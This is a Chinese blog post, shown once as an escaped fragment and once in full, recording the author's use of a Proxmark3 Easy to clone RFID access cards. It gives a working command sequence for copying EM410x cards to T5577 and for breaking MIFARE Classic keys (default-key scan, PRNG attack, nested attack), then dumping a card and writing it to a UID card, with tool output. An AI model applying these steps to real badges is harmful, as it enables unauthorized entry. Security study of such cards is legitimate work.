possible\nChecking for known tags:\nEM410x pattern found:           \nEM TAG ID      : 0000001450         //ID卡号，这个抄下来，如果是HID卡会显示HID\nUnique TAG ID  : 000000280A          \nPossible de-scramble patterns          \nHoneyWell IdentKey {          \nDEZ 8          : 00005200          \nDEZ 10         : 0000005200          \nDEZ 5.5        : 00000.05200          \nDEZ 3.5A       : 000.05200          \nDEZ 3.5B       : 000.05200          \nDEZ 3.5C       : 000.05200          \nDEZ 14/IK2     : 00000000005200          \nDEZ 15/IK3     : 000000000010250          \nDEZ 20/ZK      : 00000000000002080010          \n}\nOther          : 05200_000_00005200          \nPattern Paxton : 1331792 [0x145250]          \nPattern 1      : 16652 [0x410C]          \nPattern Sebury : 5200 0 5200  [0x1450 0x0 0x1450]          \nValid EM410x ID Found! \t\t\t//卡的类型\n```\n把T5577卡放到低频读卡区，输入命令`lf hid clone 0000001450`\n```\nproxmark3> lf hid clone 0000001450 \nCloning tag with ID 000001450          \nproxmark3> \nproxmark3> #db# DONE!\n```\n上述命令在左上方的命令树中都可以找到，左边有一些按钮和命令的介绍\n![6](/img/2018-07-26/6.png)\nID卡复制就完成了\n效果如下\n![11](/img/2018-07-26/11.jpg)\n##### 破解IC卡\n###### IC卡破解思路\n**获取任意扇区的密钥**\n- **PRNG 漏洞攻击得 0 扇区密匙**\n- **默认密码扫描获得密匙**\n- **嗅探读卡机和卡片交互数据获得密匙**\n- **模拟成 M1 卡刷卡后捕获密匙（挑读卡机，兼容性不好）**\n\n↓\n**利用MFOC漏洞用已知扇区密钥求所有扇区密钥**\n↓\n**用破解出的密匙把卡片数据读出导入电脑**\n↓\n**把电脑中的数据写入UID卡中**\n&emsp;&emsp;第一步是最重要也是最难的一步，很多IC卡往往都是难以攻破0扇区的密钥而无法进行下一步。默认密码扫描看运气，PRNG漏洞攻击概率低，后面两个虽然概率高但是成本高且实施比较困难。\n&emsp;&emsp;上面的`Proxmark Tool`是官方英文版GUI，还有国内中文版GUI（Proxmark3_EASY_GUI），中文版的GUI比较简单，不用记很多命令，原生态`PM3指令台`就是纯命令行模式，看起来也比较有逼格点。一开始我是根据资料用英文版的GUI，感觉不怎么好用，后来用了原生态后觉得原生态的好用多了，但是要记命令，命令忘记了就用中文GUI查命令ㄟ( ▔, ▔ )ㄏ。`can't slect card`这个bug也是在用了原生态之后才知道的。\n**PRNG漏洞获取0扇区密钥，486固件不掉线外，630之后的固件，有些卡可以破，有卡些会掉线并出现can't slect card**\n![7](/img/2018-07-26/7.png)\n###### 获取0扇区密钥\n扯远了，默认密码扫描`hf mf chk *1 ? t`\n```\nproxmark3> hf mf chk *1 ? t\nNo key specified, trying default keys\nchk default key[ 0] ffffffffffff\nchk default key[ 1] 000000000000\nchk default key[ 2] a0a1a2a3a4a5\nchk default key[ 3] b0b1b2b3b4b5\nchk default key[ 4] aabbccddeeff\nchk default key[ 5] 4d3a99c351dd\nchk default key[ 6] 1a982c7e459a\nchk default key[ 7] d3f7d3f7d3f7\nchk default key[ 8] 714c5c886e97\nchk default key[ 9] 587ee5f9350f\nchk default key[10] a0478cc39091\nchk default key[11] 533cb6c723f6\nchk default key[12] 8fd0a4f256e9\n--sector: 0, block:  3, key type:A, key count:13\n\t\t.\n\t\t.\n\t\t.\n--sector:15, block: 63, key type:B, key count:13\nFound valid key:[ffffffffffff]\nFound keys have been transferred to the emulator memory\n```\n密码是默认密码的时候可以扫的出来，不是默认密码可以尝试PRNG漏洞获取0扇区密钥`hf mf mifare`\n```\nproxmark3>hf mf mifare\n\t\t.\n\t\t.\n\t\t.\nuid(ea117dee) nt(431c39b0) par(0000000000000000) ks(030702000a030209) nr(800000005)\n\n\n|diff|{nr}    |ks3|ks3^5|parity         |\n+----+--------+---+-----+---------------+\n| 00 |00000005| 3 |  6  |0,0,0,0,0,0,0,0|\n| 20 |00000025| 7 |  2  |0,0,0,0,0,0,0,0|\n| 40 |00000045| 2 |  7  |0,0,0,0,0,0,0,0|\n| 60 |00000065| 0 |  5  |0,0,0,0,0,0,0,0|\n| 80 |00000085| a |  f  |0,0,0,0,0,0,0,0|\n| a0 |000000a5| 3 |  6  |0,0,0,0,0,0,0,0|\n| c0 |000000c5| 2 |  7  |0,0,0,0,0,0,0,0|\n| e0 |000000e5| 9 |  c  |0,0,0,0,0,0,0,0|\nparity is all zero,try special attack!just wait for few more seconds...         \np1:0 p2:0 p3:0 key:ffffffffffff\np1:58b87 p2:61ec p3:1 key:b4c98bd73e94\np1:c6a1b p2:d983 p3:2 key:576efc88ccc7\np1:ef844 p2:106dd p3:3 key:34ed3c6092e9\np1:f7e1e p2:10fd7 p3:4 key:2de06659d60e\np1:1239c0 p2:13fa0 p3:5 key:08b7558601a1\np1:12d1b3 p2:149c9 p3:6 key:00adbba1e330\nkey_count:7\n------------------------------------------------------------------\nKey found:ffffffffffff\n\nFound valid key:ffffffffffff\n```\n因为设备是~~我~~小姐姐的，固件是630之后的，所以会出现很多`#db# Mifare: Can't select card`,就放不了全部代码，查看固件命令`hw version`\n```\nproxmark3> hw version\n#db# Prox/RFID mark3 RFID instrument\n#db# bootrom: /-suspect 2016-11-09 00:59:56\n#db# os: /-suspect 2016-12-08 12:45:38\n#db# HF FPGA image built on 2015/03/09 at 08:41:42\n#db#   Modify by Willok(willok@163.com)\n\n#db#      proxmark3.taobao.com\n\n\nuC: AT91SAM7S256 Rev B\nEmbedded Processor: ARM7TDMI\nNonvolatile Program Memory Size: 256K bytes\nSecond Nonvolatile Program Memory Size: None\nInternal SRAM Size: 64K bytes\nArchitecture Identifier: AT91SAM7Sxx Series\nNonvolatile Program Memory Type: Embedded Flash Memory\n```\n**Tip:固件版本是根据固件的日期来看的**\n我们可以测试一下我们拿到的密钥对不对，错误不会返回最下面那一行\n```\nproxmark3> hf mf chk 0 A ffffffffffff\nchk key[ 0] ffffffffffff\n--sector: 0, block:  0, key type:A, key count: 1\nFound valid key:[ffffffffffff]\n```\n###### 知一求十五\n获取到0扇区的密钥后我们就可以通过MFOC漏洞获取所有扇区的密钥（100%成功）\n```\nproxmark3> hf mf nested 1 0 A ffffffffffff \t\t\t//0是0扇区，A密钥\nTesting known keys. Sector count=16\nnested...\nTime in nested: 4.330 (inf sec per key)\n\n-----------------------------------------------\nIterations count: 0\n\n\n|---|----------------|---|----------------|---|\n|sec|key A           |res|key B           |res|\n|---|----------------|---|----------------|---|\n|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|001|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|---|----------------|---|----------------|---|\n```\n接下来导出密钥\n```\nproxmark3> hf mf nested 1 0 A ffffffffffff d\nTesting known keys. Sector count=16\nnested...\nTime in nested: 4.302 (inf sec per key)\n\n-----------------------------------------------\nIterations count: 0\n\n\n|---|----------------|---|----------------|---|\n|sec|key A           |res|key B           |res|\n|---|----------------|---|----------------|---|\n|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|001|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|---|----------------|---|----------------|---|\nPrinting keys to binary file dumpkeys.bin...\n```\n导出后会在根目录生成一个dumpkeys.bin的文件，里面存放了16个扇区的密钥（16进制）\n![8](/img/2018-07-26/8.png)\n###### 导出数据\n拿到密码后我们就可以导出卡上的数据到电脑里\n```\nproxmark3> hf mf dump\n|-----------------------------------------|\n|------ Reading sector access bits...-----|\n|-----------------------------------------|\n#db# READ BLOCK FINISHED\n#db# READ BLOCK FINISHED\n\t  .\n\t  .\n\t  .\n#db# READ BLOCK FINISHED\n#db# READ BLOCK FINISHED\n|-----------------------------------------|\n|----- Dumping all blocks to file... -----|\n|-----------------------------------------|\n#db# READ BLOCK FINISHED\nSuccessfully read block  0 of sector  0.\n#db# READ BLOCK FINISHED\nSuccessfully read block  1 of sector  0.\n\t  .\n\t  .\n\t  .\n#db# READ BLOCK FINISHED\nSuccessfully read block  3 of sector 15.\nDumped 64 blocks (1024 bytes) to file dumpdata.bin\n```\n同样16进制打开\n![9](/img/2018-07-26/9.png)\n因为是测试卡，所以里面就没什么数据ㄟ( ▔, ▔ )ㄏ。\n###### 写入UID卡\n下一步把数据写进写UID卡\nProxmark3不能识别、使用bin文件，需要转换成eml格式\n第一个方法是运行下面的命令转成eml格式\n```\nproxmark3> script run dumptoemul.lua\n--- Executing: ./scripts/dumptoemul.lua, args''\nWrote an emulator-dump to the file EA117DEE.eml\n\n-----Finished\n```\n第二个方法是运行`dump to EML.bat`脚本转成eml格式\n![10](/img/2018-07-26/10.png)\n写入到白卡（UID卡）上\n```\nproxmark3> hf mf cload  dumpdata\nLoaded from file: dumpdata.eml\n```\n写卡是没有回显的，只能通过读取的方式查看有没有读取成功，对比两张卡的数据就可以看到数据是一模一样的，克隆就完成了\n**IC卡破解不止这一种方法，能力和设备有限，以后有机会会继续学习下去**","source":"_posts/2018-07-26-proxmark3.md","raw":"---\ntitle: Proxmark3 Easy破解门禁卡学习过程\nindex_img: /img/2018-07-26/Proxmark3.jpg\ndate: 2018-07-26 18:28:38\ntags: \n- Proxmark3\n- RFID\n- 硬件破解\n---\n\n#### 前言\n&emsp;&emsp;安全不仅仅包含网络上的安全，在我们实际生活中也同样存在很多个安全相关的事物，可以说跟科技扯上关系的事物都会有安全问题，无线，蓝牙，手机，无人机，汽车。**真正有问题的不是安全，而是人心。**很多事物的设计之初都是没有考虑安全问题的，因为人心的不坏好意迫使去考虑它的安全问题。\n<!--more-->\n#### 硬件准备\n##### 破解设备\nProxmark3 Easy\n![Proxmark3 Easy](/img/2018-07-26/Proxmark3.jpg)\n破解工具不一定是Proxmark3 Easy，只要是还能够获取和修改卡片数据的设备都可以，比如arc122u，arc122u只能读取和修改高频卡，有点不足\n![arc122u](/img/2018-07-26/arc122u.jpg)\n##### 各种卡\n准备一些ID，IC卡\n![ka](/img/2018-07-26/ka.jpg)\n这不都长一个样么（＃－.－）\n##### 区分ID卡和IC卡的方法\n1. 光照法\n![1](/img/2018-07-26/1.jpg)\n![2](/img/2018-07-26/2.jpg)\n圆形大多是ID卡，方形大多是IC卡\n2. NFC法\n拿一部带有NFC功能的手机打开NFC，卡片靠近手机会响的是IC卡，不会响的是ID卡\n\n#### 知识准备\n&emsp;&emsp;首先，门禁卡所用到的技术是RFID，具体详情可以看这里-->[传送门](https://baike.baidu.com/item/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/9524139?fromtitle=RFID&fromid=497249)，首先从频率上可以分为高频（13.56MHZ）和低频两种类型的卡，在这两个频率上又会分为多种类型的卡。常见的卡的有\n<style>\ntable th:first-of-type {  \n    width: 25%; \n}\ntable th:nth-of-type(2) {  \n    width: 7%; \n}\ntable th:nth-of-type(3) {  \n    width: 68%; \n}\n</style>\n\n|           类型              |   频率   |                                   特性                                        |\n| --------------------------|:-------:| ----------------------------------------------------------------------------|\n| Mifare S50(简称M1)          |   高频   |最常见的卡，每张卡有独一无二的UID号，可保存修改数据,常见学生卡，饭卡，公交卡，门禁卡  |\n| Mifare UltraLight（简称M0） |   高频   |低成本卡，出厂固化UID，可储存修改数据，常见地铁卡，公交卡                        \t|\n| Mifare UID（简称UID卡）     |   高频   |M1卡的变异版本，可修改UID，国外叫做中国魔术卡，可以用来克隆M1 S50的数据\t\t\t\t|\n| EM4XX（简称ID卡）           |   低频   |常用固化ID卡，出厂固化ID，只能读不能写（低成本门禁卡，小区门禁卡，停车场门禁卡）      |\n| T5577（简称可修改ID卡）      |   低频   |可用来克隆ID卡，出厂为空卡，内有三区也可储存数据，个别三区科设置密码                 |\n| HID ProxⅡ（简称HID卡）     |   低频   |美国常用的低频卡，可擦写，不与其他卡通用                                           |\n\n##### 高频\n###### M1 S50卡\n&emsp;&emsp;目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。**每个扇区都有独立的一组密码及访问控制**，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B\n每张卡的第0扇区的第0块用来春芳厂商代码，不可更改。\n```\n扇区0\t03332801198804008500b42ef0bb6aa8 块0\t \t//厂商代码，不可更改\n\t00000000000000000000000000000000 块1\t \t//数据块\n\t00000000000000000000000000000000 块2 \t\t//数据块\n\tffffffffffffff078069ffffffffffff 块3 \t\t//密码A（6字节），存储控制（4字节），密码B（6字节）\n\n扇区1\t00000000000000000000000000000000 块4 \t\t//出了第0扇区稍有不同，其他15个扇区结构完全一样\n\t00000000000000000000000000000000 块5\n\t00000000000000000000000000000000 块6\n\tffffffffffffff078069ffffffffffff 块7\n\t\t        .\n\t\t        .\n\t\t        .   \n扇区15\t00000000000000000000000000000000 块60\n\t00000000000000000000000000000000 块61\n\t00000000000000000000000000000000 块62\n\tffffffffffffff078069ffffffffffff 块63\n```\n&emsp;&emsp;中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。**密码不一定可以读取，由控制字决定。**\n###### M1 UID卡\n&emsp;&emsp;M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。\n###### FUID卡\n&emsp;&emsp;FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。**FUID可以修改0块，但只可以修改一次**，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。\n###### CUID卡\n&emsp;&emsp;CUID卡是针对FUID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过**指令**修改0块，CUID使用的是常规密码验证的方法写0块，其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。\n##### 低频\n###### ID卡\n&emsp;&emsp;ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX。每张卡出厂就有独一无二的ID号，不可改写。\n###### T5577卡\n&emsp;&emsp;T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。结构如下\n```\n0x00148040  00000000000101001000000001000000 [0]\n0xFF94C004  11111111100101001100000000000100 [1]\n0xA5464942  10100101010001100100100101000010 [2]\n0xFFFFF808  11111111111111111111100000001000 [3]\n0x0001C000  00000000000000011100000000000000 [4]\n0x0001C000  00000000000000011100000000000000 [5]\n0x0001C000  00000000000000011100000000000000 [6]\n0x0001C000  00000000000000011100000000000000 [7]\n```\n#### 破解\n##### 破解ID卡\n###### 安装驱动\n驱动下载官网网址-->[传送门](https://store.ryscc.com/blogs/news/how-to-install-a-proxmark3-driver-on-windows-10)\n安装驱动文件前需要禁用**驱动安装强制签名**，方法-->[传送门](https://jingyan.baidu.com/article/624e74594dbc8d34e8ba5aa6.html)\n驱动安装方法\n**我的电脑右键-->管理-->设备管理器-->端口下的设备右键-->更新驱动程序-->浏览我的计算机-->选择本地-->从磁盘安装--找到官方的驱动文件-->确认**\n驱动安装完成会显示图片上的样子，记住**COM端口**\n![4](/img/2018-07-26/4.png)\n###### 硬件使用方法\n**Proxmark3 Easy**\n![3](/img/2018-07-26/3.jpg)\n\n\t\t1 功能按钮\n\t\t2 ABCD工作状态指示灯\n\t\t3 USB接口\n\t\t4 电源指示灯\n\t\t5 低频读卡区\n\t\t6 高频读卡区\n&emsp;&emsp;功能按钮有`退出`、`取消`、`停止`、`强刷固件`的功能，ABCD指示灯作为设备运行的依据，闪烁说明正在进行，完全熄灭或者常亮代表攻击失败、等待。全部熄灭表示已经停止运行了，直接重新拔插设备。\n###### 破解方法\n**读卡片ID号→换上T5577卡→把ID号写入卡片→完成**\nID是没有密码只有卡号的，因此只要知道卡号就可以复制。\n软件资料包-->[密码: f8q4](https://pan.baidu.com/s/1feD3GKEaLw8jVTOGs5N40w)\n打开`官方软件固件\\pm3-bin-2.5.0\\win32(client+GUI)\\Proxmark Tool.exe`，箭头所指选择刚刚驱动安装的那个`COM端口`，连接Proxmark3，接入电脑后，电源指示灯处`POW`亮蓝灯，`FULL`亮绿灯，`CHR`闪烁微弱红灯。\n![5](/img/2018-07-26/5.png)\n在`COMMAND TO SEND`里输入`hw tune`测试天线谐振电压，高频超过5V，低频超过10V就可以正常使用。\n```\nproxmark3> hw tune\nMeasuring antenna characteristics, please wait........          \n# LF antenna: 22.27 V @   125.00 kHz          \n# LF antenna: 31.76 V @   134.00 kHz          \n# LF optimal: 31.76 V @   133.33 kHz          \n# HF antenna: 20.17 V @    13.56 MHz          \nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.\n```\n把低频ID卡（门禁卡）放到低频读卡区输入`lf search`获取ID卡的信息，把卡号抄下来，复制时要用\n```\nproxmark3> lf search\nReading 30000 bytes from device memory\nData fetched          \nSamples @ 8 bits/smpl, decimation 1:1           \nNOTE: some demods output possible binary\n  if it finds something that looks like a tag          \nFalse Positives ARE possible\nChecking for known tags:\nEM410x pattern found:           \nEM TAG ID      : 0000001450         //ID卡号，这个抄下来，如果是HID卡会显示HID\nUnique TAG ID  : 000000280A          \nPossible de-scramble patterns          \nHoneyWell IdentKey {          \nDEZ 8          : 00005200          \nDEZ 10         : 0000005200          \nDEZ 5.5        : 00000.05200          \nDEZ 3.5A       : 000.05200          \nDEZ 3.5B       : 000.05200          \nDEZ 3.5C       : 000.05200          \nDEZ 14/IK2     : 00000000005200          \nDEZ 15/IK3     : 000000000010250          \nDEZ 20/ZK      : 00000000000002080010          \n}\nOther          : 05200_000_00005200          \nPattern Paxton : 1331792 [0x145250]          \nPattern 1      : 16652 [0x410C]          \nPattern Sebury : 5200 0 5200  [0x1450 0x0 0x1450]          \nValid EM410x ID Found! \t\t\t//卡的类型\n```\n把T5577卡放到低频读卡区，输入命令`lf hid clone 0000001450`\n```\nproxmark3> lf hid clone 0000001450 \nCloning tag with ID 000001450          \nproxmark3> \nproxmark3> #db# DONE!\n```\n上述命令在左上方的命令树中都可以找到，左边有一些按钮和命令的介绍\n![6](/img/2018-07-26/6.png)\nID卡复制就完成了\n效果如下\n![11](/img/2018-07-26/11.jpg)\n##### 破解IC卡\n###### IC卡破解思路\n**获取任意扇区的密钥**\n- **PRNG 漏洞攻击得 0 扇区密匙**\n- **默认密码扫描获得密匙**\n- **嗅探读卡机和卡片交互数据获得密匙**\n- **模拟成 M1 卡刷卡后捕获密匙（挑读卡机，兼容性不好）**\n\n↓\n**利用MFOC漏洞用已知扇区密钥求所有扇区密钥**\n↓\n**用破解出的密匙把卡片数据读出导入电脑**\n↓\n**把电脑中的数据写入UID卡中**\n&emsp;&emsp;第一步是最重要也是最难的一步，很多IC卡往往都是难以攻破0扇区的密钥而无法进行下一步。默认密码扫描看运气，PRNG漏洞攻击概率低，后面两个虽然概率高但是成本高且实施比较困难。\n&emsp;&emsp;上面的`Proxmark Tool`是官方英文版GUI，还有国内中文版GUI（Proxmark3_EASY_GUI），中文版的GUI比较简单，不用记很多命令，原生态`PM3指令台`就是纯命令行模式，看起来也比较有逼格点。一开始我是根据资料用英文版的GUI，感觉不怎么好用，后来用了原生态后觉得原生态的好用多了，但是要记命令，命令忘记了就用中文GUI查命令ㄟ( ▔, ▔ )ㄏ。`can't slect card`这个bug也是在用了原生态之后才知道的。\n**PRNG漏洞获取0扇区密钥，486固件不掉线外，630之后的固件，有些卡可以破，有卡些会掉线并出现can't slect card**\n![7](/img/2018-07-26/7.png)\n###### 获取0扇区密钥\n扯远了，默认密码扫描`hf mf chk *1 ? t`\n```\nproxmark3> hf mf chk *1 ? t\nNo key specified, trying default keys\nchk default key[ 0] ffffffffffff\nchk default key[ 1] 000000000000\nchk default key[ 2] a0a1a2a3a4a5\nchk default key[ 3] b0b1b2b3b4b5\nchk default key[ 4] aabbccddeeff\nchk default key[ 5] 4d3a99c351dd\nchk default key[ 6] 1a982c7e459a\nchk default key[ 7] d3f7d3f7d3f7\nchk default key[ 8] 714c5c886e97\nchk default key[ 9] 587ee5f9350f\nchk default key[10] a0478cc39091\nchk default key[11] 533cb6c723f6\nchk default key[12] 8fd0a4f256e9\n--sector: 0, block:  3, key type:A, key count:13\n\t\t.\n\t\t.\n\t\t.\n--sector:15, block: 63, key type:B, key count:13\nFound valid key:[ffffffffffff]\nFound keys have been transferred to the emulator memory\n```\n密码是默认密码的时候可以扫的出来，不是默认密码可以尝试PRNG漏洞获取0扇区密钥`hf mf mifare`\n```\nproxmark3>hf mf mifare\n\t\t.\n\t\t.\n\t\t.\nuid(ea117dee) nt(431c39b0) par(0000000000000000) ks(030702000a030209) nr(800000005)\n\n\n|diff|{nr}    |ks3|ks3^5|parity         |\n+----+--------+---+-----+---------------+\n| 00 |00000005| 3 |  6  |0,0,0,0,0,0,0,0|\n| 20 |00000025| 7 |  2  |0,0,0,0,0,0,0,0|\n| 40 |00000045| 2 |  7  |0,0,0,0,0,0,0,0|\n| 60 |00000065| 0 |  5  |0,0,0,0,0,0,0,0|\n| 80 |00000085| a |  f  |0,0,0,0,0,0,0,0|\n| a0 |000000a5| 3 |  6  |0,0,0,0,0,0,0,0|\n| c0 |000000c5| 2 |  7  |0,0,0,0,0,0,0,0|\n| e0 |000000e5| 9 |  c  |0,0,0,0,0,0,0,0|\nparity is all zero,try special attack!just wait for few more seconds...         \np1:0 p2:0 p3:0 key:ffffffffffff\np1:58b87 p2:61ec p3:1 key:b4c98bd73e94\np1:c6a1b p2:d983 p3:2 key:576efc88ccc7\np1:ef844 p2:106dd p3:3 key:34ed3c6092e9\np1:f7e1e p2:10fd7 p3:4 key:2de06659d60e\np1:1239c0 p2:13fa0 p3:5 key:08b7558601a1\np1:12d1b3 p2:149c9 p3:6 key:00adbba1e330\nkey_count:7\n------------------------------------------------------------------\nKey found:ffffffffffff\n\nFound valid key:ffffffffffff\n```\n因为设备是~~我~~小姐姐的，固件是630之后的，所以会出现很多`#db# Mifare: Can't select card`,就放不了全部代码，查看固件命令`hw version`\n```\nproxmark3> hw version\n#db# Prox/RFID mark3 RFID instrument\n#db# bootrom: /-suspect 2016-11-09 00:59:56\n#db# os: /-suspect 2016-12-08 12:45:38\n#db# HF FPGA image built on 2015/03/09 at 08:41:42\n#db#   Modify by Willok(willok@163.com)\n\n#db#      proxmark3.taobao.com\n\n\nuC: AT91SAM7S256 Rev B\nEmbedded Processor: ARM7TDMI\nNonvolatile Program Memory Size: 256K bytes\nSecond Nonvolatile Program Memory Size: None\nInternal SRAM Size: 64K bytes\nArchitecture Identifier: AT91SAM7Sxx Series\nNonvolatile Program Memory Type: Embedded Flash Memory\n```\n**Tip:固件版本是根据固件的日期来看的**\n我们可以测试一下我们拿到的密钥对不对，错误不会返回最下面那一行\n```\nproxmark3> hf mf chk 0 A ffffffffffff\nchk key[ 0] ffffffffffff\n--sector: 0, block:  0, key type:A, key count: 1\nFound valid key:[ffffffffffff]\n```\n###### 知一求十五\n获取到0扇区的密钥后我们就可以通过MFOC漏洞获取所有扇区的密钥（100%成功）\n```\nproxmark3> hf mf nested 1 0 A ffffffffffff \t\t\t//0是0扇区，A密钥\nTesting known keys. Sector count=16\nnested...\nTime in nested: 4.330 (inf sec per key)\n\n-----------------------------------------------\nIterations count: 0\n\n\n|---|----------------|---|----------------|---|\n|sec|key A           |res|key B           |res|\n|---|----------------|---|----------------|---|\n|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|001|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|---|----------------|---|----------------|---|\n```\n接下来导出密钥\n```\nproxmark3> hf mf nested 1 0 A ffffffffffff d\nTesting known keys. Sector count=16\nnested...\nTime in nested: 4.302 (inf sec per key)\n\n-----------------------------------------------\nIterations count: 0\n\n\n|---|----------------|---|----------------|---|\n|sec|key A           |res|key B           |res|\n|---|----------------|---|----------------|---|\n|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|001|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |\n|---|----------------|---|----------------|---|\nPrinting keys to binary file dumpkeys.bin...\n```\n导出后会在根目录生成一个dumpkeys.bin的文件，里面存放了16个扇区的密钥（16进制）\n![8](/img/2018-07-26/8.png)\n###### 导出数据\n拿到密码后我们就可以导出卡上的数据到电脑里\n```\nproxmark3> hf mf dump\n|-----------------------------------------|\n|------ Reading sector access bits...-----|\n|-----------------------------------------|\n#db# READ BLOCK FINISHED\n#db# READ BLOCK FINISHED\n\t  .\n\t  .\n\t  .\n#db# READ BLOCK FINISHED\n#db# READ BLOCK FINISHED\n|-----------------------------------------|\n|----- Dumping all blocks to file... -----|\n|-----------------------------------------|\n#db# READ BLOCK FINISHED\nSuccessfully read block  0 of sector  0.\n#db# READ BLOCK FINISHED\nSuccessfully read block  1 of sector  0.\n\t  .\n\t  .\n\t  .\n#db# READ BLOCK FINISHED\nSuccessfully read block  3 of sector 15.\nDumped 64 blocks (1024 bytes) to file dumpdata.bin\n```\n同样16进制打开\n![9](/img/2018-07-26/9.png)\n因为是测试卡，所以里面就没什么数据ㄟ( ▔, ▔ )ㄏ。\n###### 写入UID卡\n下一步把数据写进写UID卡\nProxmark3不能识别、使用bin文件，需要转换成eml格式\n第一个方法是运行下面的命令转成eml格式\n```\nproxmark3> script run dumptoemul.lua\n--- Executing: ./scripts/dumptoemul.lua, args''\nWrote an emulator-dump to the file EA117DEE.eml\n\n-----Finished\n```\n第二个方法是运行`dump to 